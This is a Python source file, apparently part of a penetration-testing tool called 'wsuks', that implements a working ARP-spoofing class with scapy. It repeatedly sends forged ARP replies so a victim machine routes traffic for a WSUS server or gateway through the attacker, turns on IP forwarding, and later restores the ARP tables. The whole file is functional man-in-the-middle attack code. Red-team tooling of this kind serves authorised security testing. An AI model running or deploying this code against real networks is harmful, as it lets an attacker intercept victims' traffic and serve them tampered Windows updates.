from ipaddress import ip_address, IPv4Network
import logging
from pathlib import Path
import sys
import time
import traceback
import scapy.all as scapy
from scapy.arch import get_if_addr
import netifaces as ni
from threading import Thread
import os
import signal


class ArpSpoofer:
    """Enable MITM attacks with ARP spoofing."""

    def __init__(self, interface):
        self.logger = logging.getLogger("wsuks")
        self.interface = interface
        self.isRunning = False
        self.targetIp = None
        self.targetMac = None
        self.spoofIp = None
        self.ip_forwarding = None

    def _spoof(self, targetIp, spoofIp):
        """
        Spoof the target's ARP table by sending a fake ARP response with our MAC address as the sender.

        :param targetIp: The victim's IP address
        :param spoofIp: The IP address to spoof
        """
        self.targetMac = scapy.getmacbyip(targetIp)
        self.logger.debug(f"Target IP address: {targetIp}")
        self.logger.debug(f"Target MAC address: {self.targetMac}")
        if self.targetMac is None:
            self.logger.error(f"ARP request for IP address {targetIp} failed! Target is not reachable! Exiting...")
            os.kill(os.getpid(), signal.SIGINT)
        else:
            while self.isRunning:
                self.logger.debug(f"Tell target {targetIp} that spoofed IP address {spoofIp} is at our MAC address")
                packet = scapy.ARP(op="is-at", pdst=targetIp, hwdst=self.targetMac, psrc=spoofIp)
                scapy.send(packet, verbose=False)
                time.sleep(1)

    def _restore(self, targetIp, source_ip):
        """
        Restore the target's ARP table by sending a real ARP response.
        This is done by sending the target the spoofed IP address and the real MAC address of the spoofed IP address.

        :param targetIp: The victim's IP address
        :param source_ip: The spoofed IP address
        """
        try:
            self.logger.info(f"Restoring ARP tables for target {targetIp} and spoofed IP address {source_ip}")
            self.logger.debug(f"Tell target {targetIp} the correct MAC-Adress for spoofed IP address {source_ip}")
            source_mac = scapy.getmacbyip(source_ip)
            packet = scapy.ARP(op="is-at", pdst=targetIp, hwdst=self.targetMac, psrc=source_ip, hwsrc=source_mac)
            scapy.send(packet, verbose=False)
        except Exception as e:
            self.logger.error(f"Error while restoring ARP tables: {e}")
            if self.logger.level == logging.DEBUG:
                traceback.print_exc()

    def get_default_gateway_ip(self, iface):
        """
        Returns the default gateway IP address of the specified Interface

        :param iface: The interface to get the default gateway IP address from
        :return: The default gateway IP address or None
        """
        try:
            return [x[2] for x in scapy.conf.route.routes if x[3] == iface and x[2] != "0.0.0.0"][0]  # noqa: RUF015
        except IndexError:
            self.logger.error(f"No gateway IP found for interface {iface}")
            return None

    def check_spoofIp_subnet(self, targetIp, spoofIp):
        """
        Returns the IP address to spoof.
        If the IP address is not in the same subnet as the host, the gateway IP address is returned.
        If the host is the gateway and the IP address to spoof is not in the same subnet, we exit as we can't spoof ourself.

        :param targetIp: The victim's IP address
        :param spoofIp: The IP address to spoof
        """
        net_mask = ni.ifaddresses(self.interface)[ni.AF_INET][0]["netmask"]
        interface_ip = get_if_addr(self.interface)
        self.subnet = IPv4Network(interface_ip + "/" + net_mask, False)

        if ip_address(targetIp) not in self.subnet:
            self.logger.critical(f"Target IP address {targetIp} is not in the same subnet as the host! Forgot -I? Exiting...")
            sys.exit(1)
        elif ip_address(spoofIp) not in self.subnet:
            gateway = self.get_default_gateway_ip(self.interface)
            if not gateway:
                self.logger.critical(f"WSUS IP address {spoofIp} is not in the same subnet and {self.interface} has no gateway!")
                self.logger.critical("Can't arp spoof the WSUS IP address! Exiting...")
                sys.exit(1)
            else:
                self.logger.warning(f"WSUS IP address {spoofIp} is not in the same subnet as the host! Spoofing now the gateway IP address: {gateway}")
                return gateway
        else:
            return spoofIp

    def enable_ip_forwarding(self):
        """Enable IP forwarding if the the spoofed IP address is not in the same subnet as the host."""
        # Read ip_fowarding setting and enable it if necessary
        self.ip_forwarding = Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()

        if self.ip_forwarding == "0":
            self.logger.warning("IP fowarding not enabled, enabling now")
            Path("/proc/sys/net/ipv4/ip_forward").write_text("1")

    def disable_ip_forwarding(self):
        """Disable IP forwarding if it was enabled before."""
        if self.ip_forwarding == "0":
            self.logger.warning("Restoring: Disabling IP fowarding")
            Path("/proc/sys/net/ipv4/ip_forward").write_text("0")

    def start(self, targetIp, spoofIp):
        """
        Start the ARP spoofing process.

        :param targetIp: The victim's IP address
        :param spoofIp: The IP address to spoof
        """
        self.targetIp = targetIp
        self.spoofIp = self.check_spoofIp_subnet(targetIp, spoofIp)
        self.isRunning = True

        # If we arp spoof the router enable IP forwarding, so that the target still has network access.
        if ip_address(spoofIp) not in self.subnet:
            self.enable_ip_forwarding()

        self.logger.info(f"Starting ARP spoofing for target {self.targetIp} and spoofing IP address {self.spoofIp}")
        t1 = Thread(target=self._spoof, args=(self.targetIp, self.spoofIp))
        t1.start()

    def stop(self):
        """Stop the ARP spoofing process."""
        if self.isRunning and self.targetIp and self.spoofIp:
            self.logger.info(f"Stopping ARP spoofing for target {self.targetIp}")
            self.isRunning = False
            self._restore(self.targetIp, self.spoofIp)

            # Restore IP forwarding if it was enabled before
            self.disable_ip_forwarding()
        else:
            self.logger.error("ARP spoofing is not running")
